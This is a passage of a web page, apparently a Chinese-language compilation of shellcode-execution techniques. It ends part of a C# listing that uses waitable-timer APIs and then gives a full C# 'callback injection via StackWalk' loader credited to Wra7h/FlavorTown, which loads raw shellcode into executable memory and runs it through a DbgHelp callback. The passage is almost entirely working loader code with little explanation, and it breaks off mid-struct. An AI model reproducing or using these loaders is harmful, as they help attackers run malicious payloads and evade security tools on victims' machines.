class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">61</span><br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">CreateWaitableTimer</span>(<span class="hljs-params"><br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpTimerAttributes,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;bManualReset,<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;lpTimerName</span>)</span>;<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Explicit,&nbsp;Size&nbsp;=&nbsp;8)</span>]<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">struct</span>&nbsp;LARGE_INTEGER<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">FieldOffset(0)</span>]&nbsp;<span class="hljs-keyword">public</span>&nbsp;Int64&nbsp;QuadPart;<br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">FieldOffset(0)</span>]&nbsp;<span class="hljs-keyword">public</span>&nbsp;UInt32&nbsp;LowPart;<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">FieldOffset(4)</span>]&nbsp;<span class="hljs-keyword">public</span>&nbsp;Int32&nbsp;HighPart;<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">75</span><br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">SetWaitableTimer</span>(<span class="hljs-params">IntPtr&nbsp;hTimer,<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;LARGE_INTEGER&nbsp;pDueTime,<br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;lPeriod,<br><span class="linenum hljs-number">80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pfnCompletionRoutine,<br><span class="linenum hljs-number">81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpArgToCompletionRoutine,<br><span class="linenum hljs-number">82</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;fResume</span>)</span>;<br><span class="linenum hljs-number">83</span><br><span class="linenum hljs-number">84</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">85</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">SleepEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">86</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UInt32&nbsp;dwMilliseconds,<br><span class="linenum hljs-number">87</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;bAlertable</span>)</span>;<br><span class="linenum hljs-number">88</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">89</span>}<br></code></pre>
<h1 id="h15cstackwalk"><span>15.回调函数注入 (C#) 通过 StackWalk</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number">  1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number">  2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number">  3</span><br><span class="linenum hljs-number">  4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number">  5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number">  6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number">  7</span><br><span class="linenum hljs-number">  8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">StackWalk</span><br><span class="linenum hljs-number">  9</span>{<br><span class="linenum hljs-number"> 10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number"> 11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number"> 13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number"> 14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number"> 15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number"> 17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;StackWalk.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number"> 18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number"> 19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 20</span><br><span class="linenum hljs-number"> 21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number"> 22</span><br><span class="linenum hljs-number"> 23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number"> 24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number"> 25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number"> 26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number"> 27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number"> 28</span><br><span class="linenum hljs-number"> 29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number"> 30</span><br><span class="linenum hljs-number"> 31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number"> 32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number"> 33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number"> 34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number"> 35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number"> 36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number"> 37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number"> 38</span><br><span class="linenum hljs-number"> 39</span><br><span class="linenum hljs-number"> 40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;IMAGE_FILE_MACHINE_AMD64&nbsp;=&nbsp;<span class="hljs-number">0x8664</span>;<br><span class="linenum hljs-number"> 41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STACKFRAME&nbsp;sStackFrame&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;STACKFRAME();<br><span class="linenum hljs-number"> 42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT64&nbsp;sContext&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;CONTEXT64();<br><span class="linenum hljs-number"> 43</span><br><span class="linenum hljs-number"> 44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StackWalk(IMAGE_FILE_MACHINE_AMD64,&nbsp;Process.GetCurrentProcess().Handle,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;sStackFrame,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;sContext,&nbsp;IntPtr.Zero,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;IntPtr.Zero);<br><span class="linenum hljs-number"> 45</span><br><span class="linenum hljs-number"> 46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 47</span><br><span class="linenum hljs-number"> 48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number"> 49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number"> 51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number"> 52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number"> 53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number"> 54</span><br><span class="linenum hljs-number"> 55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number"> 56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number"> 58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number"> 59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number"> 60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number"> 61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number"> 62</span><br><span class="linenum hljs-number"> 63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"DbgHelp.dll"</span>)</span>]<br><span class="linenum hljs-number"> 64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">StackWalk</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;MachineType,<br><span class="linenum hljs-number"> 66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number"> 67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hThread,<br><span class="linenum hljs-number"> 68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;STACKFRAME&nbsp;StackFrame,<br><span class="linenum hljs-number"> 69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;CONTEXT64&nbsp;ContextRecord,<br><span class="linenum hljs-number"> 70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;ReadMemoryRoutine,<br><span class="linenum hljs-number"> 71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;FunctionTableAccessRoutine,<br><span class="linenum hljs-number"> 72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;GetModuleBaseRoutine,<br><span class="linenum hljs-number"> 73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;TranslateAddress</span>)</span>;<br><span class="linenum hljs-number"> 74</span><br><span class="linenum hljs-number"> 75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">enum</span>&nbsp;CONTEXT_FLAGS&nbsp;:&nbsp;<span class="hljs-keyword">uint</span><br><span class="linenum hljs-number"> 76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_i386&nbsp;=&nbsp;<span class="hljs-number">0x10000</span>,<br><span class="linenum hljs-number"> 78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_i486&nbsp;=&nbsp;<span class="hljs-number">0x10000</span>,&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;&nbsp;same&nbsp;as&nbsp;i386</span><br><span class="linenum hljs-number"> 79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_CONTROL&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x01</span>,&nbsp;<span class="hljs-comment">//&nbsp;SS:SP,&nbsp;CS:IP,&nbsp;FLAGS,&nbsp;BP</span><br><span class="linenum hljs-number"> 80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_INTEGER&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x02</span>,&nbsp;<span class="hljs-comment">//&nbsp;AX,&nbsp;BX,&nbsp;CX,&nbsp;DX,&nbsp;SI,&nbsp;DI</span><br><span class="linenum hljs-number"> 81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_SEGMENTS&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x04</span>,&nbsp;<span class="hljs-comment">//&nbsp;DS,&nbsp;ES,&nbsp;FS,&nbsp;GS</span><br><span class="linenum hljs-number"> 82</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_FLOATING_POINT&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x08</span>,&nbsp;<span class="hljs-comment">//&nbsp;387&nbsp;state</span><br><span class="linenum hljs-number"> 83</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_DEBUG_REGISTERS&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x10</span>,&nbsp;<span class="hljs-comment">//&nbsp;DB&nbsp;0-3,6,7</span><br><span class="linenum hljs-number"> 84</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_EXTENDED_REGISTERS&nbsp;=&nbsp;CONTEXT_i386&nbsp;|&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//&nbsp;cpu&nbsp;specific&nbsp;extensions</span><br><span class="linenum hljs-number"> 85</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_FULL&nbsp;=&nbsp;CONTEXT_CONTROL&nbsp;|&nbsp;CONTEXT_INTEGER&nbsp;|&nbsp;CONTEXT_SEGMENTS,<br><span class="linenum hljs-number"> 86</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT_ALL&nbsp;=&nbsp;CONTEXT_CONTROL&nbsp;|&nbsp;CONTEXT_INTEGER&nbsp;|&nbsp;CONTEXT_SEGMENTS&nbsp;|&nbsp;CONTEXT_FLOATING_POINT&nbsp;|&nbsp;CONTEXT_DEBUG_REGISTERS&nbsp;|&nbsp;CONTEXT_EXTENDED_REGISTERS<br><span class="linenum hljs-number"> 87</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 88</span><br><span class="linenum hljs-number"> 89</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential)</span>]<br><span class="linenum hljs-number"> 90</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;FLOATING_SAVE_AREA<br><span class="linenum hljs-number"> 91</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 92</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;ControlWord;<br><span class="linenum hljs-number"> 93</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;StatusWord;<br><span class="linenum hljs-number"> 94</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;TagWord;<br><span class="linenum hljs-number"> 95</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span 